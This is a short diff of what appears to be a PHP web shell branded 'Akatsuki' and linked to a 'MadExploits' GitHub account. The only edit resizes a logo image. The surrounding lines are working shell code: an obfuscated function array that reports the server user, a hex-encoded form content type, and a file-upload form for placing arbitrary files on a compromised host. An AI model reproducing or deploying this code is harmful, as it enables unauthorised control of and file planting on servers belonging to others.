@@ -553,7 +553,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
             <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
-            <li class="logo-❟❛❟Akatsuki"><img width="400" height="600" src="https://i.imgur.com/x68HbJu.png" align="right"></li>
+            <li class="logo-❟❛❟Akatsuki"><img width="400" height="450" src="https://i.imgur.com/x68HbJu.png" align="right"></li>
             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                 <li class="form-upload"><input type="submit" value="Upload" name="❟❛❟Akatsuki-up-submit" class="btn-submit">&nbsp;<input type="file" name="❟❛❟Akatsuki-upload" class="form-file"></li>
             </form>
